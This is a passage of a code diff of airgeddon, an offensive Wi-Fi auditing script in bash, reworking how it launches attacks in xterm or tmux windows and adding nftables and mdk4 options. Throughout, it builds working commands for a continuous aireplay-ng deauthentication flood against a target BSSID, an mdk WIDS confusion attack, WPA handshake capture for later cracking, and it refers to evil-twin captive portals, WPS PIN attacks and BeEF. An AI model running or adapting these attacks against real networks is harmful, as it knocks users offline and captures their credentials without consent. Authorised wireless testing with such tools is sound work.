 			fi
 		;;
 		2)
 			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
-				attack_handshake_menu "new"
 			else
 				ask_timeout "capture_handshake"
 				capture_handshake_window
 				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
-				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1 &
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}"
+					processidattack="${global_process_pid}"
+					global_process_pid=""
+				fi
 				sleeptimeattack=12
+				launch_handshake_capture
 			fi
 		;;
 		3)
 			if contains_element "${attack_handshake_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
-				attack_handshake_menu "new"
 			else
 				ask_timeout "capture_handshake"
 				capture_handshake_window
 				recalculate_windows_sizes
-				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
+				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "${mdk_command} ${interface} w -e ${essid} -c ${channel}"
+					processidattack="${global_process_pid}"
+					global_process_pid=""
+				fi
 				sleeptimeattack=16
+				launch_handshake_capture
 			fi
 		;;
 		*)
 			invalid_menu_option
-			attack_handshake_menu "new"
 		;;
 	esac
 
-	processidattack=$!
-	sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
+	dos_handshake_menu
+}
 
-	attack_handshake_menu "handshake"
+#Handshake capture launcher
+function launch_handshake_capture() {
+
+	debug_print
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		processidattack=$!
+		sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null
+	else
+		sleep ${sleeptimeattack} && kill ${processidattack} && kill_tmux_windows "Capturing Handshake" &> /dev/null
+	fi
+
+	handshake_capture_check
+	if check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "silent"; then
+
+		handshakepath="${default_save_path}"
+		lastcharhandshakepath=${handshakepath: -1}
+		if [ "${lastcharhandshakepath}" != "/" ]; then
+			handshakepath="${handshakepath}/"
+		fi
+		handshakefilename="handshake-${bssid}.cap"
+		handshakepath="${handshakepath}${handshakefilename}"
+
+		language_strings "${language}" 162 "yellow"
+		validpath=1
+		while [[ "${validpath}" != "0" ]]; do
+			read_path "handshake"
+		done
+
+		cp "${tmpdir}${standardhandshake_filename}" "${enteredpath}"
+		echo
+		language_strings "${language}" 149 "blue"
+		language_strings "${language}" 115 "read"
+		return_to_handshake_tools_menu=1
+	else
+		echo
+		language_strings "${language}" 146 "red"
+		language_strings "${language}" 115 "read"
+	fi
 }
 
 #Launch the Handshake capture window
@@ -10271,8 +11607,14 @@ function capture_handshake_window() {
 
 	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
 	recalculate_windows_sizes
-	xterm +j -sb -rightbar -geometry "${g1_topright_window}" -T "Capturing Handshake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${tmpdir}handshake" "${interface}" > /dev/null 2>&1 &
-	processidcapture=$!
+	manage_output "+j -sb -rightbar -geometry ${g1_topright_window} -T \"Capturing Handshake\"" "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}" "Capturing Handshake" "active"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		get_tmux_process_id "airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}"
+		processidcapture="${global_process_pid}"
+		global_process_pid=""
+	else
+		processidcapture=$!
+	fi
 }
 
 #Manage target exploration and parse the output files
@@ -10310,8 +11652,10 @@ function explore_for_targets_option() {
 				fi
 			;;
 		esac
+		cypher_cmd=" --encrypt ${cypher_filter} "
 	else
 		cypher_filter=""
+		cypher_cmd=" "
 		language_strings "${language}" 366 "yellow"
 	fi
 	language_strings "${language}" 115 "read"
@@ -10327,7 +11671,8 @@ function explore_for_targets_option() {
 	fi
 
 	recalculate_windows_sizes
-	xterm +j -bg black -fg white -geometry "${g1_topright_window}" -T "Exploring for targets" -e airodump-ng -w "${tmpdir}nws" --encrypt "${cypher_filter}" "${interface}" --band "${airodump_band_modifier}" > /dev/null 2>&1
+	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Exploring for targets\"" "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets" "active"
+	wait_for_process "airodump-ng -w ${tmpdir}nws${cypher_cmd}${interface} --band ${airodump_band_modifier}" "Exploring for targets"
 	targetline=$(awk '/(^Station[s]?|^Client[es]?)/{print NR}' < "${tmpdir}nws-01.csv")
 	targetline=$((targetline - 1))
 
@@ -10426,11 +11771,11 @@ function explore_for_wps_targets_option() {
 	wash_band_modifier=""
 	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 1 ]; then
 		if check_dual_scan_on_wash; then
-			wash_band_modifier="-2 -5"
+			wash_band_modifier=" -2 -5"
 		else
 			ask_yesno 145 "no"
 			if [ "${yesno}" = "y" ]; then
-				wash_band_modifier="-5"
+				wash_band_modifier=" -5"
 			fi
 		fi
 	fi
@@ -10443,7 +11788,8 @@ function explore_for_wps_targets_option() {
 	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
 
 	recalculate_windows_sizes
-	xterm +j -bg black -fg white -geometry "${g1_topright_window}" -T "Exploring for WPS targets" -e "wash -i \"${interface}\" ${wash_ifaces_already_set[${interface}]} ${wash_band_modifier} | tee \"${tmpdir}wps.txt\"" > /dev/null 2>&1
+	manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Exploring for WPS targets\"" "wash -i \"${interface}\"${wash_ifaces_already_set[${interface}]}${wash_band_modifier} | tee \"${tmpdir}wps.txt\"" "Exploring for WPS targets" "active"
+	wait_for_process "wash -i \"${interface}\"${wash_ifaces_already_set[${interface}]}${wash_band_modifier}" "Exploring for WPS targets"
 
 	readarray -t WASH_PREVIEW < <(cat < "${tmpdir}wps.txt" 2> /dev/null)
 
@@ -10702,7 +12048,7 @@ function set_wash_parameterization() {
 
 	for item in "${WASH_OUTPUT[@]}"; do
 		if [[ ${item} =~ ^\[\!\].*bad[[:space:]]FCS ]]; then
-			fcs="-C"
+			fcs=" -C "
 			break
 		fi
 	done
@@ -10880,7 +12226,6 @@ function et_prerequisites() {
 		fi
 		retry_handshake_capture=0
 		retrying_handshake_capture=0
-		internet_interface_selected=0
 
 		if ! check_bssid_in_captured_file "${et_handshake}"; then
 			return_to_et_main_menu=1
@@ -11065,9 +12410,9 @@ function et_dos_menu() {
 		language_strings "${language}" 266
 	fi
 	print_simple_separator
-	language_strings "${language}" 139 mdk3_attack_dependencies[@]
+	language_strings "${language}" 139 mdk_attack_dependencies[@]
 	language_strings "${language}" 140 aireplay_attack_dependencies[@]
-	language_strings "${language}" 141 mdk3_attack_dependencies[@]
+	language_strings "${language}" 141 mdk_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " et_dos_option
@@ -11082,7 +12427,7 @@ function et_dos_menu() {
 			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				et_dos_attack="Mdk3"
+				et_dos_attack="${mdk_command}"
 
 				echo
 				language_strings "${language}" 509 "yellow"
@@ -11091,36 +12436,7 @@ function et_dos_menu() {
 					return
 				fi
 
-				if [ "${et_mode}" = "et_captive_portal" ]; then
-					if [ ${internet_interface_selected} -eq 0 ]; then
-						language_strings "${language}" 330 "blue"
-						ask_yesno 326 "no"
-						if [ "${yesno}" = "n" ]; then
-							if check_et_without_internet_compatibility; then
-								captive_portal_mode="dnsblackhole"
-								internet_interface_selected=1
-								echo
-								language_strings "${language}" 329 "yellow"
-								language_strings "${language}" 115 "read"
-								et_prerequisites
-							else
-								echo
-								language_strings "${language}" 327 "red"
-								language_strings "${language}" 115 "read"
-								return_to_et_main_menu=1
-								return
-							fi
-						else
-							if detect_internet_interface; then
-								et_prerequisites
-							else
-								return
-							fi
-						fi
-					else
-						et_prerequisites
-					fi
-				elif [ -n "${enterprise_mode}" ]; then
+				if [[ "${et_mode}" = "et_captive_portal" ]] || [[ -n "${enterprise_mode}" ]]; then
 					et_prerequisites
 				else
 					if detect_internet_interface; then
@@ -11144,36 +12460,7 @@ function et_dos_menu() {
 					return
 				fi
 
-				if [ "${et_mode}" = "et_captive_portal" ]; then
-					if [ ${internet_interface_selected} -eq 0 ]; then
-						language_strings "${language}" 330 "blue"
-						ask_yesno 326 "no"
-						if [ "${yesno}" = "n" ]; then
-							if check_et_without_internet_compatibility; then
-								captive_portal_mode="dnsblackhole"
-								internet_interface_selected=1
-								echo
-								language_strings "${language}" 329 "yellow"
-								language_strings "${language}" 115 "read"
-								et_prerequisites
-							else
-								echo
-								language_strings "${language}" 327 "red"
-								language_strings "${language}" 115 "read"
-								return_to_et_main_menu=1
-								return
-							fi
-						else
-							if detect_internet_interface; then
-								et_prerequisites
-							else
-								return
-							fi
-						fi
-					else
-						et_prerequisites
-					fi
-				elif [ -n "${enterprise_mode}" ]; then
+				if [[ "${et_mode}" = "et_captive_portal" ]] || [[ -n "${enterprise_mode}" ]]; then
 					et_prerequisites
 				else
 					if detect_internet_interface; then
@@ -11197,36 +12484,7 @@ function et_dos_menu() {
 					return
 				fi
 
-				if [ "${et_mode}" = "et_captive_portal" ]; then
-					if [ ${internet_interface_selected} -eq 0 ]; then
-						language_strings "${language}" 330 "blue"
-						ask_yesno 326 "no"
-						if [ "${yesno}" = "n" ]; then
-							if check_et_without_internet_compatibility; then
-								captive_portal_mode="dnsblackhole"
-								internet_interface_selected=1
-								echo
-								language_strings "${language}" 329 "yellow"
-								language_strings "${language}" 115 "read"
-								et_prerequisites
-							else
-								echo
-								language_strings "${language}" 327 "red"
-								language_strings "${language}" 115 "read"
-								return_to_et_main_menu=1
-								return
-							fi
-						else
-							if detect_internet_interface; then
-								et_prerequisites
-							else
-								return
-							fi
-						fi
-					else
-						et_prerequisites
-					fi
-				elif [ -n "${enterprise_mode}" ]; then
+				if [[ "${et_mode}" = "et_captive_portal" ]] || [[ -n "${enterprise_mode}" ]]; then
 					et_prerequisites
 				else
 					if detect_internet_interface; then
@@ -11406,7 +12664,11 @@ function capture_traps() {
 				esac
 			;;
 			SIGINT|SIGHUP)
-				hardcore_exit
+				if [ "${no_hardcore_exit}" -eq 0 ]; then
+					hardcore_exit
+				else
+					exit ${exit_code}
+				fi
 			;;
 		esac
 	else
@@ -11464,9 +12726,9 @@ function exit_script_option() {
 		action_on_exit_taken=1
 		language_strings "${language}" 297 "multiline"
 		clean_routing_rules
-		kill "$(ps -C dhcpd --no-headers -o pid)" &> /dev/null
-		kill "$(ps -C hostapd --no-headers -o pid)" &> /dev/null
-		kill "$(ps -C lighttpd --no-headers -o pid)" &> /dev/null
+		kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
+		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
+		kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
 		kill_beef
 		time_loop
 		echo -e "${green_color} Ok\r${normal_color}"
@@ -11483,10 +12745,17 @@ function exit_script_option() {
 		language_strings "${language}" 160 "yellow"
 	fi
 
-	clean_env_vars
-
 	echo
-	exit ${exit_code}
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		clean_env_vars
+		no_hardcore_exit=1
+		if ! kill_tmux_session "${session_name}" > /dev/null; then
+			exit ${exit_code}
+		fi
+	else
+		clean_env_vars
+		exit ${exit_code}
+	fi
 }
 
 #Exit the script managing possible pending tasks but not showing anything
@@ -11510,9 +12779,9 @@ function hardcore_exit() {
 
 	if [ ${routing_modified} -eq 1 ]; then
 		clean_routing_rules
-		kill "$(ps -C dhcpd --no-headers -o pid)" &> /dev/null
-		kill "$(ps -C hostapd --no-headers -o pid)" &> /dev/null
-		kill "$(ps -C lighttpd --no-headers -o pid)" &> /dev/null
+		kill "$(ps -C dhcpd --no-headers -o pid | tr -d ' ')" &> /dev/null
+		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
+		kill "$(ps -C lighttpd --no-headers -o pid | tr -d ' ')" &> /dev/null
 		kill_beef
 	fi
 
@@ -11523,9 +12792,15 @@ function hardcore_exit() {
 		echo -e "${green_color} Ok\r${normal_color}"
 	fi
 
-	clean_env_vars
-
-	exit ${exit_code}
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		clean_env_vars
+		if ! kill_tmux_session "${session_name}"; then
+			exit ${exit_code}
+		fi
+	else
+		clean_env_vars
+		exit ${exit_code}
+	fi
 }
 
 #Generate a small time loop printing some dots
@@ -11540,15 +12815,36 @@ function time_loop() {
 	done
 }
 
-#Fix iptables if needed
-function iptables_fix() {
+#Detect iptables/nftables
+function iptables_nftables_detection() {
 
 	debug_print
 
-	iptables_cmd="iptables"
+	if ! "${AIRGEDDON_FORCE_IPTABLES:-false}"; then
+		if hash nft 2> /dev/null; then
+			iptables_nftables=1
+		else
+			iptables_nftables=0
+		fi
+	else
+		if ! hash iptables 2> /dev/null && ! hash iptables-legacy 2> /dev/null; then
+			echo
+			language_strings "${language}" 615 "red"
+			exit_code=1
+			exit_script_option
+		else
+			iptables_nftables=0
+		fi
+	fi
 
-	if hash iptables-legacy 2> /dev/null; then
-		iptables_cmd="iptables-legacy"
+	if [ "${iptables_nftables}" -eq 0 ]; then
+		if hash iptables-legacy 2> /dev/null; then
+			iptables_cmd="iptables-legacy"
+		else
+			iptables_cmd="iptables"
+		fi
+	else
+		iptables_cmd="nft"
 	fi
 }
 
@@ -11618,6 +12914,14 @@ function get_hashcat_version() {
 	hashcat_version=${hashcat_version#"v"}
 }
 
+#Determine beef version
+function get_beef_version() {
+
+	debug_print
+
+	beef_version=$(grep "version" "${beef_path}${beef_default_cfg_file}" 2> /dev/null | grep -oE "[0-9.]+")
+}
+
 #Determine bettercap version
 function get_bettercap_version() {
 
@@ -11625,7 +12929,7 @@ function get_bettercap_version() {
 
 	bettercap_version=$(bettercap -v 2> /dev/null | grep -E "^bettercap [0-9]" | awk '{print $2}')
 	if [ -z "${bettercap_version}" ]; then
-		bettercap_version=$(bettercap -eval "q" 2>/dev/null | grep -E "bettercap v[0-9\.]*" | awk '{print $2}')
+		bettercap_version=$(bettercap -eval "q" 2> /dev/null | grep -E "bettercap v[0-9\.]*" | awk '{print $2}')
 		bettercap_version=${bettercap_version#"v"}
 	fi
 }
@@ -11644,9 +12948,9 @@ function get_reaver_version() {
 
 	debug_print
 
-	reaver_version=$(reaver -h 2>&1 > /dev/null | grep -E "^Reaver v[0-9]" | awk '{print $2}')
+	reaver_version=$(reaver -h 2>&1 > /dev/null | grep -E "^Reaver v[0-9]" | awk '{print $2}' | grep -Eo "v[0-9\.]+")
 	if [ -z "${reaver_version}" ]; then
-		reaver_version=$(reaver -h 2> /dev/null | grep -E "^Reaver v[0-9]" | awk '{print $2}')
+		reaver_version=$(reaver -h 2> /dev/null | grep -E "^Reaver v[0-9]" | awk '{print $2}' | grep -Eo "v[0-9\.]+")
 	fi
 	reaver_version=${reaver_version#"v"}
 }
@@ -11680,6 +12984,17 @@ function validate_reaver_pixiewps_version() {
 	debug_print
 
 	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_reaver_pixiewps_version}"; then
+		return 0
+	fi
+	return 1
+}
+
+#Validate if reaver version is able to perform null pin attack
+function validate_reaver_nullpin_version() {
+
+	debug_print
+
+	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_reaver_nullpin_version}"; then
 		return 0
 	fi
 	return 1
@@ -11786,6 +13101,61 @@ function check_pins_database_file() {
 			language_strings "${language}" 414 "yellow"
 			return 1
 		fi
+	fi
+}
+
+#Get and write options form options config file
+function update_options_config_file() {
+
+	debug_print
+
+	case "${1}" in
+		"getdata")
+			readarray -t OPTION_VARS < <(grep "AIRGEDDON_" "${rc_path}" 2> /dev/null)
+		;;
+		"writedata")
+			local option_name
+			local option_value
+			for item in "${OPTION_VARS[@]}"; do
+				option_name="${item%=*}"
+				option_value="${item#*=}"
+				for item2 in "${ordered_options_env_vars[@]}"; do
+					if [ "${item2}" = "${option_name}" ]; then
+						sed -ri "s:(${option_name})=(.+):\1=${option_value}:" "${rc_path}" 2> /dev/null
+					fi
+				done
+			done
+		;;
+	esac
+}
+
+#Download the options config file
+function download_options_config_file() {
+
+	debug_print
+
+	local options_config_file_downloaded=0
+	options_config_file=$(timeout -s SIGTERM 15 curl -L ${urlscript_options_config_file} 2> /dev/null)
+
+	if [[ -n "${options_config_file}" ]] && [[ "${options_config_file}" != "${curl_404_error}" ]]; then
+		options_config_file_downloaded=1
+	else
+		http_proxy_detect
+		if [ "${http_proxy_set}" -eq 1 ]; then
+
+			options_config_file=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_options_config_file} 2> /dev/null)
+			if [[ -n "${options_config_file}" ]] && [[ "${options_config_file}" != "${curl_404_error}" ]]; then
+				options_config_file_downloaded=1
+			fi
+		fi
+	fi
+
+	if [ "${options_config_file_downloaded}" -eq 1 ]; then
+		rm -rf "${rc_path}" 2> /dev/null
+		echo "${options_config_file}" > "${rc_path}"
+		return 0
+	else
+		return 1
 	fi
 }
 
@@ -12052,6 +13422,13 @@ function special_distro_features() {
 			ywindow_edge_lines=1
 			ywindow_edge_pixels=-10
 		;;
+		"Pentoo")
+			networkmanager_cmd="rc-service NetworkManager restart"
+			xratio=6.2
+			yratio=14.6
+			ywindow_edge_lines=1
+			ywindow_edge_pixels=-10
+		;;
 		"Red Hat")
 			networkmanager_cmd="service NetworkManager restart"
 			xratio=6.2
@@ -12184,6 +13561,7 @@ function check_root_permissions() {
 }
 
 #Print Linux known distros
+#shellcheck disable=SC2207
 function print_known_distros() {
 
 	debug_print
@@ -12308,7 +13686,7 @@ function check_compatibility() {
 		echo
 		language_strings "${language}" 111 "red"
 		echo
-		if ! "${AIRGEDDON_SILENT_CHECKS:-false}"; then
+		if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
 			language_strings "${language}" 581 "blue"
 			echo
 		fi
@@ -12509,6 +13887,13 @@ function initialize_script_settings() {
 	secondary_interface_airmon_compatible=1
 	declare -gA wps_data_array
 	declare -gA interfaces_band_info
+	tmux_error=0
+	custom_certificates_country=""
+	custom_certificates_state=""
+	custom_certificates_locale=""
+	custom_certificates_organization=""
+	custom_certificates_email=""
+	custom_certificates_cn=""
 }
 
 #Detect if there is a working X window system excepting for docker container and wayland
@@ -12652,6 +14037,7 @@ function recalculate_windows_sizes() {
 }
 
 #Initialization of env vars
+#shellcheck disable=SC2145
 function env_vars_initialization() {
 
 	debug_print
@@ -12665,9 +14051,19 @@ function env_vars_initialization() {
 									"AIRGEDDON_SILENT_CHECKS"
 									"AIRGEDDON_PRINT_HINTS"
 									"AIRGEDDON_5GHZ_ENABLED"
+									"AIRGEDDON_FORCE_IPTABLES"
+									"AIRGEDDON_MDK_VERSION"
 									"AIRGEDDON_DEVELOPMENT_MODE"
 									"AIRGEDDON_DEBUG_MODE"
+									"AIRGEDDON_WINDOWS_HANDLING"
 									)
+
+	declare -gA nonboolean_options_env_vars
+	nonboolean_options_env_vars["${ordered_options_env_vars[9]},default_value"]="mdk4"
+	nonboolean_options_env_vars["${ordered_options_env_vars[12]},default_value"]="xterm"
+
+	nonboolean_options_env_vars["${ordered_options_env_vars[9]},rcfile_text"]="#Available values: mdk3, mdk4 - Define which mdk version is going to be used - Default value mdk4"
+	nonboolean_options_env_vars["${ordered_options_env_vars[12]},rcfile_text"]="#Available values: xterm, tmux - Define the needed tool to be used for windows handling - Default value xterm"
 
 	declare -gA boolean_options_env_vars
 	boolean_options_env_vars["${ordered_options_env_vars[0]},default_value"]="true"
@@ -12679,24 +14075,35 @@ function env_vars_initialization() {
 	boolean_options_env_vars["${ordered_options_env_vars[6]},default_value"]="true"
 	boolean_options_env_vars["${ordered_options_env_vars[7]},default_value"]="true"
 	boolean_options_env_vars["${ordered_options_env_vars[8]},default_value"]="false"
-	boolean_options_env_vars["${ordered_options_env_vars[9]},default_value"]="false"
+	boolean_options_env_vars["${ordered_options_env_vars[10]},default_value"]="false"
+	boolean_options_env_vars["${ordered_options_env_vars[11]},default_value"]="false"
 
 	boolean_options_env_vars["${ordered_options_env_vars[0]},rcfile_text"]="#Enabled true / Disabled false - Auto update feature (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[0]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[1]},rcfile_text"]="#Enabled true / Disabled false - Skip intro (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[1]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[2]},rcfile_text"]="#Enabled true / Disabled false - Allow colorized output - Default value ${boolean_options_env_vars[${ordered_options_env_vars[2]},'default_value']}"
-	boolean_options_env_vars["${ordered_options_env_vars[3]},rcfile_text"]="#Enabled true / Disabled false - Allow extended colorized output (ccze needed, it has no effect on disabled basic colors) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[3]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[3]},rcfile_text"]="#Enabled true / Disabled false - Allow extended colorized output (ccze tool needed, it has no effect on disabled basic colors) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[3]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[4]},rcfile_text"]="#Enabled true / Disabled false - Auto change language feature - Default value ${boolean_options_env_vars[${ordered_options_env_vars[4]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[5]},rcfile_text"]="#Enabled true / Disabled false - Dependencies, root and bash version checks are done silently (it has no effect on development mode) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[5]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[6]},rcfile_text"]="#Enabled true / Disabled false - Print help hints on menus - Default value ${boolean_options_env_vars[${ordered_options_env_vars[6]},'default_value']}"
 	boolean_options_env_vars["${ordered_options_env_vars[7]},rcfile_text"]="#Enabled true / Disabled false - Enable 5Ghz support (it has no effect if your cards are not 5Ghz compatible cards) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[7]},'default_value']}"
-	boolean_options_env_vars["${ordered_options_env_vars[8]},rcfile_text"]="#Enabled true / Disabled false - Development mode for faster development skipping intro and all initial checks - Default value ${boolean_options_env_vars[${ordered_options_env_vars[8]},'default_value']}"
-	boolean_options_env_vars["${ordered_options_env_vars[9]},rcfile_text"]="#Enabled true / Disabled false - Debug mode for development printing debug information - Default value ${boolean_options_env_vars[${ordered_options_env_vars[9]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[8]},rcfile_text"]="#Enabled true / Disabled false - Force to use iptables instead of nftables (it has no effect if nftables are not present) - Default value ${boolean_options_env_vars[${ordered_options_env_vars[8]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[10]},rcfile_text"]="#Enabled true / Disabled false - Development mode for faster development skipping intro and all initial checks - Default value ${boolean_options_env_vars[${ordered_options_env_vars[9]},'default_value']}"
+	boolean_options_env_vars["${ordered_options_env_vars[11]},rcfile_text"]="#Enabled true / Disabled false - Debug mode for development printing debug information - Default value ${boolean_options_env_vars[${ordered_options_env_vars[10]},'default_value']}"
 
-	readarray -t ENV_VARS_ELEMENTS < <(printf %s\\n "${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
-	ENV_BOOLEAN_VARS_ELEMENTS=("${ENV_VARS_ELEMENTS[@]}")
+	readarray -t ENV_VARS_ELEMENTS < <(printf %s\\n "${!nonboolean_options_env_vars[@]} ${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
+	readarray -t ENV_BOOLEAN_VARS_ELEMENTS < <(printf %s\\n "${!boolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
+	readarray -t ENV_NONBOOLEAN_VARS_ELEMENTS < <(printf %s\\n "${!nonboolean_options_env_vars[@]}" | cut -d, -f1 | sort -u)
+	ARRAY_ENV_VARS_ELEMENTS=("${ENV_VARS_ELEMENTS[@]}")
+	ARRAY_ENV_BOOLEAN_VARS_ELEMENTS=("${ENV_BOOLEAN_VARS_ELEMENTS[@]}")
+	ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS=("${ENV_NONBOOLEAN_VARS_ELEMENTS[@]}")
 
-	if [ ! -f "${scriptfolder}${rc_file}" ]; then
-		create_rcfile
+	if [ -f "${osversionfile_dir}${alternative_rc_file_name}" ]; then
+		rc_path="${osversionfile_dir}${alternative_rc_file_name}"
+	else
+		rc_path="${scriptfolder}${rc_file_name}"
+		if [ ! -f "${rc_path}" ]; then
+			create_rcfile
+		fi
 	fi
 
 	env_vars_values_validation
@@ -12709,23 +14116,52 @@ function env_vars_values_validation() {
 
 	declare -gA errors_on_configuration_vars
 
-	for item in "${ENV_VARS_ELEMENTS[@]}"; do
+	for item in "${ARRAY_ENV_VARS_ELEMENTS[@]}"; do
 		if [ -z "${!item}" ]; then
-			if grep "${item}" "${scriptfolder}${rc_file}" > /dev/null; then
-				eval "export $(grep "${item}" "${scriptfolder}${rc_file}")"
+			if grep "${item}" "${rc_path}" > /dev/null; then
+				eval "export $(grep "${item}" "${rc_path}")"
 			else
-				export ${item}=${boolean_options_env_vars["${item}",'default_value']}
-				errors_on_configuration_vars["${item},missing_var"]="${boolean_options_env_vars[${item},'default_value']}"
+				if echo "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
+					eval "export ${item}=${boolean_options_env_vars[${item},'default_value']}"
+					errors_on_configuration_vars["${item},missing_var"]="${boolean_options_env_vars[${item},'default_value']}"
+				elif echo "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
+					eval "export ${item}=${nonboolean_options_env_vars[${item},'default_value']}"
+					errors_on_configuration_vars["${item},missing_var"]="${nonboolean_options_env_vars[${item},'default_value']}"
+				fi
 			fi
 		fi
 	done
 
-	for item in "${ENV_BOOLEAN_VARS_ELEMENTS[@]}"; do
+	for item in "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}"; do
 		if ! [[ "${!item,,}" =~ ^(true|false)$ ]]; then
 			errors_on_configuration_vars["${item},invalid_value"]="${boolean_options_env_vars[${item},'default_value']}"
-			export ${item}=${boolean_options_env_vars["${item}",'default_value']}
+			eval "export ${item}=${boolean_options_env_vars[${item},'default_value']}"
 		fi
 	done
+
+	for item in "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}"; do
+		if [ "${item}" = "AIRGEDDON_WINDOWS_HANDLING" ]; then
+			if ! [[ "${!item,,}" =~ ^(xterm|tmux)$ ]]; then
+				errors_on_configuration_vars["${item},invalid_value"]="${nonboolean_options_env_vars[${item},'default_value']}"
+				eval "export ${item}=${nonboolean_options_env_vars[${item},'default_value']}"
+			fi
+		elif [ "${item}" = "AIRGEDDON_MDK_VERSION" ]; then
+			if ! [[ "${!item,,}" =~ ^(mdk3|mdk4)$ ]]; then
+				errors_on_configuration_vars["${item},invalid_value"]="${nonboolean_options_env_vars[${item},'default_value']}"
+				eval "export ${item}=${nonboolean_options_env_vars[${item},'default_value']}"
+			fi
+		fi
+	done
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		if hash tmux 2> /dev/null; then
+			transfer_to_tmux
+			if ! check_inside_tmux; then
+				exit_code=1
+				exit ${exit_code}
+			fi
+		fi
+	fi
 }
 
 #Print possible issues on configuration vars
@@ -12771,14 +14207,22 @@ function create_rcfile() {
 	local counter=0
 	for item in "${ordered_options_env_vars[@]}"; do
 		counter=$((counter + 1))
-		if [ -n "${ENV_BOOLEAN_VARS_ELEMENTS[${item}]}" ]; then
+		if echo "${ARRAY_ENV_BOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
 			{
 			echo -e "${boolean_options_env_vars[${item},"rcfile_text"]}"
 			echo -e "${item}=${boolean_options_env_vars[${item},"default_value"]}"
 			if [ ${counter} -ne ${#ordered_options_env_vars[@]} ]; then
 				echo -ne "\n"
 			fi
-			} >> "${scriptfolder}${rc_file}" 2> /dev/null
+			} >> "${rc_path}" 2> /dev/null
+		elif echo "${ARRAY_ENV_NONBOOLEAN_VARS_ELEMENTS[@]}" | grep -q "${item}"; then
+			{
+			echo -e "${nonboolean_options_env_vars[${item},"rcfile_text"]}"
+			echo -e "${item}=${nonboolean_options_env_vars[${item},"default_value"]}"
+			if [ ${counter} -ne ${#ordered_options_env_vars[@]} ]; then
+				echo -ne "\n"
+			fi
+			} >> "${rc_path}" 2> /dev/null
 		fi
 	done
 }
@@ -12845,6 +14289,231 @@ function initialize_colors() {
 	white_color="\e[1;97m"
 }
 
+#Kill tmux session started by airgeddon
+function kill_tmux_session() {
+
+	debug_print
+
